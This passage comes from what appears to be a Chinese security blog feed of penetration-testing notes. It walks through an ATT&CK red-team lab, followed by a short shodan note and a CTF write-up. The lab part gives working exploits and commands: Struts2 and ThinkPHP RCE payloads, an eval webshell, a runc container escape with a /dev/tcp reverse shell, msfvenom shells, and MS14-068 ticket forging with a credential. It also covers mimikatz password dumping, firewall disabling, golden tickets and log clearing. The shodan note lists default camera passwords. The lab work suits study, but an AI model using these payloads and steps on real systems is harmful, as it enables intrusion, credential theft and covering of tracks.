class="line">http://192.168.0.104:2003/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>至于包含shell也是比较简单的，select执行一个php代码，包含自己的session即可。</p><p>下面是st2-045，st2系列也是一个经典的系列，直接构造下面的数据包即可rce。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.8,es;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br><span class="line">Content-Type: %&#123;#context[&apos;com.opensymphony.xwork2.dispatcher.HttpServletResponse&apos;].addHeader(&apos;vulhub&apos;,233*233)&#125;.multipart/form-data</span><br></pre></td></tr></table></figure><p>三个漏洞都完成了</p><p>下面进行docker逃逸CVE-2019-5736</p><p> 漏洞影响在默认设置下运行的Docker容器，并且攻击者可以使用它来获得主机上的root级访问权限。 </p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞点在于runC，RunC是一个容器运行时，最初是作为Docker的一部分开发的，后来作为一个单独的开源工具和库被提取出来。作为“低级别”容器运行时，runC主要由“高级别”容器运行时（例如Docker）用于生成和运行容器，尽管它可以用作独立工具。<br>像Docker这样的“高级别”容器运行时通常会实现镜像创建和管理等功能，并且可以使用runC来处理与运行容器相关的任务：创建容器、将进程附加到现有容器等。<br>在Docker 18.09.2之前的版本中使用了的runc版本小于1.0-rc6，因此允许攻击者重写宿主机上的runc 二进制文件，攻击者可以在宿主机上以root身份执行命令。</p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><ul><li>宿主机利用攻击者提供的image来创建一个新的container 。</li><li>拥有container root权限，并且该container后续被docker exec attach。</li></ul><p>一句话描述，docker 18.09.2之前的runc存在漏洞，攻击者可以修改runc的二进制文件导致提权。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>docker version &lt;=18.09.2<br>RunC version &lt;=1.0-rc6</p><p> 编译go脚本生成攻击payload。<br>（<a href="https://github.com/Frichetten/CVE-2019-5736-PoC）" target="_blank" rel="noopener">https://github.com/Frichetten/CVE-2019-5736-PoC）</a> </p><p> 将go脚本中的命令修改为反弹shell </p><p>var payload = “#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/192.168.157.128/4444 0&gt;&amp; 1”</p><p> 编译生成payload</p><p>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</p><p>将该payload拷贝到docker容器中</p><p> 执行payload</p><p> 攻击者开启nc监听 </p><p> 受害者启动docker容器时，触发payload。 </p><p> 成功反弹shell。 </p><p>这里我先用冰蝎上传msf的payload</p><blockquote><p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.157.128 LPORT=5555 -f raw &gt; shell1.jsp</p></blockquote><p>然后msf监听</p><blockquote><p>msf5 &gt; use exploit/multi/handler<br>msf5 exploit(multi/handler) &gt; set payload java/jsp_shell_reverse_tcp<br>payload =&gt; java/jsp_shell_reverse_tcp<br>msf5 exploit(multi/handler) &gt; set lhost 192.168.157.128<br>lhost =&gt; 192.168.157.128<br>msf5 exploit(multi/handler) &gt; set lport 5555<br>lport =&gt; 5555<br>msf5 exploit(multi/handler) &gt; exploit</p></blockquote><p>得到shell</p><p>运行main文件</p><blockquote><p>chmod 777 ./main</p><p>./main</p></blockquote><p>然后开始用msf监听4444端口</p><p>模拟docker进入主机</p><blockquote><p>docker exec -it 09dd4e5bfa91 /bin/bash</p></blockquote><p>kali就接收到主机的shell， 实现了docker容器逃逸 </p><p>只是一个普通的shell，想办法把它升级为meterpreter</p><blockquote><p>post/multi/manage/shell_to_meterprete </p></blockquote><p>然后添加路由</p><blockquote><p>run autoroute -s 192.168.183.0/24</p></blockquote><p>用arp- a扫描  发现192.168.183.128</p><p>然后用 auxiliary/scanner/portscan/tcp 进行扫描</p><p>开放135端口尝试用 smb_version 进行探测系统版本信息</p><p> 发现是win7 sp1且位于DEMO域中 </p><p> 使用ms17-010 没有成功</p><p>有两种方法</p><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><p>使用<code>eternalblue_doublepulsar</code>得到了<code>shell</code><br>下载链接：<a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit" target="_blank" rel="noopener">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</a><br>参考文章：<a href="https://blog.csdn.net/userpass_word/article/details/85124266" target="_blank" rel="noopener">https://blog.csdn.net/userpass_word/article/details/85124266</a> </p><h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><p> 有可能是uac的问题，换成bypassUAC的进行测试 </p><p>然后收集域信息</p><blockquote><p>net user /domain</p><p>net group “Domain controllers” /domain</p><p>ping WIN-ENS2VR5TR3N.demo.com</p><p>有现成的<code>ms14-068.exe</code>以及<code>mimikatz</code>还有以及生成好的<code>TGT</code>文件 </p></blockquote><p>使用<code>mimikatz</code>抓取<code>douser</code>的密码，利用<code>whoami /all</code>获取<code>douser</code>的<code>Sid</code><br>然后利用<code>ms14-068</code>生成票据 </p><blockquote><p>MS14-068.exe -u <a href="mailto:douser@demo.com" target="_blank" rel="noopener">douser@demo.com</a> -p Dotest123 -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130</p></blockquote><p>然后导入票据 </p><blockquote><p>Kerberos::ptc c:\users\douser\Desktop\TGT_douser@demo.com.ccache</p></blockquote><p>成功获得域管理员权限 </p><p>利用<code>copy</code>命令上传一个正向<code>shell</code>，通过<code>psexec</code>连接域控执行打一个<code>shell</code>回来 </p><p>上传<code>mimikatz.exe</code>，抓取到域管理员明文密码 </p><p> 最后三台主机运行<code>clearev</code>清除日志痕迹 </p><h1 id="ATT-amp-CK红队评估实战靶场-五"><a href="#ATT-amp-CK红队评估实战靶场-五" class="headerlink" title="ATT&amp;CK红队评估实战靶场(五)"></a>ATT&amp;CK红队评估实战靶场(五)</h1><p>运行phpstudy</p><p>然后进行扫描</p><blockquote><p>nmap -sV -p- 192.168.135.0/24</p><p>map scan report for 192.168.135.150<br>Host is up (0.00042s latency).<br>Not shown: 65533 filtered ports<br>PORT     STATE SERVICE VERSION<br>80/tcp   open  http    Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.5.38)<br>3306/tcp open  mysql   MySQL (unauthorized)</p></blockquote><p>然后访问</p><p>发现是ThinkPHP V5</p><p>可以用goby进行扫描</p><blockquote><p>描述</p><p>ThinkPHP是一个轻量级PHP开发框架。该框架存在远程代码执行漏洞，可直接控制服务器。<br>漏洞危害<br>该漏洞可能导致攻击者在服务器端任意执行代码，进而控制整个服务器。</p><p>解决方案<br>1、升级至最新版本：<a href="http://www.thinkphp.cn/down.html" target="_blank" rel="noopener">http://www.thinkphp.cn/down.html</a></p><p>2、或者直接修改源码：</p><p>将/ThinkPHP/Lib/Core/Dispatcher.class.php文件中的</p><p>$res = preg_replace(‘@(w+)’.$depr.’([^’.$depr.’/]+)@e’, ‘$var[&#39;\1&#39;]=”\2”;’, implode($depr,$paths));</p><p>修改为：</p><p>$res = preg_replace(‘@(w+)’.$depr.’([^’.$depr.’/]+)@e’, ‘$var[&#39;\1&#39;]=”\2’;’, implode($depr,$paths));</p><p>将preg_replace第二个参数中的双引号改为单引号，防止其中的php变量语法被解析执行。</p><p>payload:</p><p><a href="http://192.168.135.150/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1" target="_blank" rel="noopener">http://192.168.135.150/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</a></p><p>写入shell</p><p><a href="http://192.168.135.150/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo" target="_blank" rel="noopener">http://192.168.135.150/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo</a> ^&lt;?php @eval($_POST[“bypass”]);?^&gt;&gt;shell.php </p><p>蚁剑进行连接</p></blockquote><p>也可以扫描下目录</p><blockquote><p>python3 dirsearch.py -u 192.168.135.150 -e *</p><p>[10:40:55] 200 -    2KB - /add.php<br>[10:41:52] 200 -    1KB - /favicon.ico<br>[10:42:03] 200 -  931B  - /Index<br>[10:42:03] 200 -  931B  - /index<br>[10:42:03] 200 -  931B  - /index.html<br>[10:42:03] 200 -  931B  - /index.php<br>[10:42:03] 200 -  931B  - /INDEX.PHP<br>[10:42:03] 200 -  931B  - /index.PHP<br>[10:42:41] 200 -   24B  - /robots.txt          </p></blockquote><p>发现add.php</p><p>用字典跑</p><p>得到密码</p><p>admins</p><h3 id="进行内网信息探测"><a href="#进行内网信息探测" class="headerlink" title="进行内网信息探测"></a>进行内网信息探测</h3><p>上线cs</p><blockquote><p>ipconfig /all</p><p>域控制器的域名是sun.com</p></blockquote><p>进行提权然后用mimikatz和hashdump抓取密码</p><p>然后内网扫描存活主机 </p><blockquote><p>portscan 192.168.138.0/24 1-6000 arp 10</p></blockquote><p>发现192.168.138.138存活</p><blockquote><p>shell net group “domain controllers” /domain 查看域控制器名称</p><p>DC</p></blockquote><p>得到域控的ip</p><blockquote><p>ping DC.sun.com</p><p>确认192.168.138.138是域控制器</p></blockquote><p>进行psexec传递</p><p>因为内网不出网</p><p>所以先监听192.168.138.136 smb</p><p>创建smb通道</p><p>右键spawn smb</p><p>然后进行psexec传递</p><p>但是win7开启了防火墙,监听不了</p><p>关闭防火墙</p><blockquote><p>shell netsh advfirewall set allprofiles state off</p></blockquote><p>得到域控</p><p><img src="/2020/09/06/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/%E5%AE%9E%E6%88%98%E4%BA%94.png" alt></p><p> 持久控制</p><p>黄金票据</p><p>hashdump</p><p>得到krbtgt的hash</p><p>mimikatz获得sid</p><p>接下来在普通域成员机器上制作黄金票据并导入</p><p>导入之前无法访问域控的共享文件</p><p> <strong>生成黄金票据并导入</strong> </p><p><img src="/2020/09/06/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shodan基础使用</title>
      <link href="/2020/07/28/shodan%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/"/>
      <url>/2020/07/28/shodan%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p><a href="https://b404.gitbooks.io/shodan-manual/content/instruction.html" target="_blank" rel="noopener">shodan手册</a></p><p>几种摄像头关键词和默认密码</p><blockquote><p>JAWS为“CCTV”网络摄像头关键字 </p><p>常见弱密码：admin，空，111111,888888,123456；</p><p> NVR webserver </p><p>admin 888888是默认账号密码 </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>刷题记录</title>
      <link href="/2020/07/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/07/14/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>​    点开后，右键查看代码，发现有个base32加密的，解密后是1nD3x.php页面提示，进入查看源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">$file = <span class="string">"1nD3x.php"</span>;</span><br><span class="line">$shana = $_GET[<span class="string">'shana'</span>];</span><br><span class="line">$passwd = $_GET[<span class="string">'passwd'</span>];</span><br><span class="line">$arg = <span class="string">''</span>;</span><br><span class="line">$code = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span>, $_SERVER[<span class="string">'QUERY_STRING'</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You seem to want to do something bad?'</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/http|https/i'</span>, $_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^aqua_is_cute$/'</span>, $_GET[<span class="string">'debu'</span>]) &amp;&amp; $_GET[<span class="string">'debu'</span>] !== <span class="string">'aqua_is_cute'</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Neeeeee! Good Job!&lt;br&gt;"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'fxck you! What do you want to do ?!'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]/i'</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'fxck you! I hate English!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">'debu_debu_aqua'</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">"flag"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Very good! you know my password. But what is flag?&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9]*$/isD'</span>, $code) || </span><br><span class="line">preg_match(<span class="string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">    $code(<span class="string">''</span>, $arg); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="url编码绕过对-SERVER-‘QUERY-STRING’-的过滤"><a href="#url编码绕过对-SERVER-‘QUERY-STRING’-的过滤" class="headerlink" title="url编码绕过对$_SERVER[‘QUERY_STRING’]的过滤"></a>url编码绕过对$_SERVER[‘QUERY_STRING’]的过滤</h3><p>看到第一处过滤使用 preg_match 过滤了很多关键词，但是他是用 $_SERVER[‘QUERY_STRING’] 来获得查询语句的，不会进行解码，可以进行url编码绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (    preg_match(<span class="string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span>, $_SERVER[<span class="string">'QUERY_STRING'</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You seem to want to do something bad?'</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="对preg-match中-xxx-类型匹配的绕过"><a href="#对preg-match中-xxx-类型匹配的绕过" class="headerlink" title="对preg_match中/^xxx$/类型匹配的绕过"></a>对preg_match中/^xxx$/类型匹配的绕过</h3><p>第二处可以通过在句尾加上%0a进行绕过 </p><p>因为 preg_match 只匹配第一行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/http|https/i'</span>, $_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^aqua_is_cute$/'</span>, $_GET[<span class="string">'debu'</span>]) &amp;&amp; $_GET[<span class="string">'debu'</span>] !== <span class="string">'aqua_is_cute'</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Neeeeee! Good Job!&lt;br&gt;"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'fxck you! What do you want to do ?!'</span>);</span><br></pre></td></tr></table></figure><h3 id="绕过-REQUEST中数据检测"><a href="#绕过-REQUEST中数据检测" class="headerlink" title="绕过$_REQUEST中数据检测"></a>绕过$_REQUEST中数据检测</h3><p>第三处检测是检测数据中是否有字母</p><p>$_REQUEST同时接受GET和POST的数据，并且POST具有更高的优先值。 </p><p> 只需要同时GET和POST同一个参数就可以绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]/i'</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'fxck you! I hate English!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="file-get-contents进行比较内容"><a href="#file-get-contents进行比较内容" class="headerlink" title="file_get_contents进行比较内容"></a>file_get_contents进行比较内容</h3><p>第四处检测是检测 得到的$file中的文件内容是否是’debu_debu_aqua’</p><p>一般来说可以用php://input或data://<br>php://input是将post过来的数据全部当做文件内容<br>data://有以下几种用法<br>    data://text/plain,<?php phpinfo()?><br>    data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</p><p>这里用 file=data:text/plain,debu_debu_aqua 进行绕过检测</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">'debu_debu_aqua'</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;"</span>);</span><br></pre></td></tr></table></figure><h3 id="绕过sha1比较"><a href="#绕过sha1比较" class="headerlink" title="绕过sha1比较"></a>绕过sha1比较</h3><p>第五处检测绕过</p><p>sha1()函数是无法处理数组的，如果sha1()的参数为一个数组会报Warning并返回False</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">"flag"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Very good! you know my password. But what is flag?&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="create-function-代码注入"><a href="#create-function-代码注入" class="headerlink" title="create_function()代码注入"></a>create_function()代码注入</h3><p>最后一处检测</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$arg = <span class="string">''</span>;</span><br><span class="line">$code = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">"flag"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Very good! you know my password. But what is flag?&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9]*$/isD'</span>, $code) || </span><br><span class="line">preg_match(<span class="string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">    $code(<span class="string">''</span>, $arg); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>extract() 函数从数组中将变量导入到当前的符号表。<br>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。<br>$arg和$code变量都是可控的，因为extract()函数使用数组键名作为变量名，使用数组键值作为变量值，针对数组中的每个元素，将在当前符号表中创建对应的一个变量。因此只要extract()内的数组键名为arg和code，键值为我们构造的用来注入的代码，即可实现$arg和$code的变量覆盖，导致代码注入。</p><p> create_function() </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$myfunc = create_function(<span class="string">'$a, $b'</span>, <span class="string">'return $a+$b;'</span>);</span><br></pre></td></tr></table></figure><p>相当于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myfunc</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $a+$b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果第二个参数没有限制，可以构造下面的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$myFunc = create_function(<span class="string">'$a, $b'</span>, <span class="string">'return($a+$b);&#125;eval($_POST["a"]);\\'</span>)</span><br></pre></td></tr></table></figure><p>相当于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunc</span><span class="params">($a, $b)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">return</span> $a+$b; &#125; </span><br><span class="line"><span class="keyword">eval</span>($_POST[<span class="string">'a'</span>]);<span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure><p>结合上面的extract()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;flag[arg]=&#125;a();//&amp;flag[code]=create_function</span><br></pre></td></tr></table></figure><h3 id="get-defined-vars-输出所有变量的值"><a href="#get-defined-vars-输出所有变量的值" class="headerlink" title="get_defined_vars()输出所有变量的值"></a>get_defined_vars()输出所有变量的值</h3><p>方法一</p><p>过滤了include 还能用require<br>过滤了引号，可以使用那些参数可以不加引号的函数，require()代替require “ “<br>过滤了flag，可以base64编码。其他过滤的不用便是</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(base64_decode(MWZsYWcucGhw));</span><br></pre></td></tr></table></figure><p>方法二</p><p>正则匹配了&amp;和|导致无法与运算和或运算，但是可以^异或和~按位取反</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;%66%6c%61%67[arg]=&#125;require(%ce%99%93%9e%98%d1%8f%97%8f^%ff%ff%ff%ff%ff%ff%ff%ff%ff);var_dump(get_defined_vars());//</span><br></pre></td></tr></table></figure><p>其中，%ce%99%93%9e%98%d1%8f%97%8f^%ff%ff%ff%ff%ff%ff%ff%ff%ff 这个异或运算的结果就是1flag.php</p><p>生成异或表达式脚本呢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$flag = <span class="string">"1 f l a g . p h p"</span>;</span><br><span class="line">$arr = explode(<span class="string">' '</span>, $flag);</span><br><span class="line"></span><br><span class="line">foreach ($arr as $key 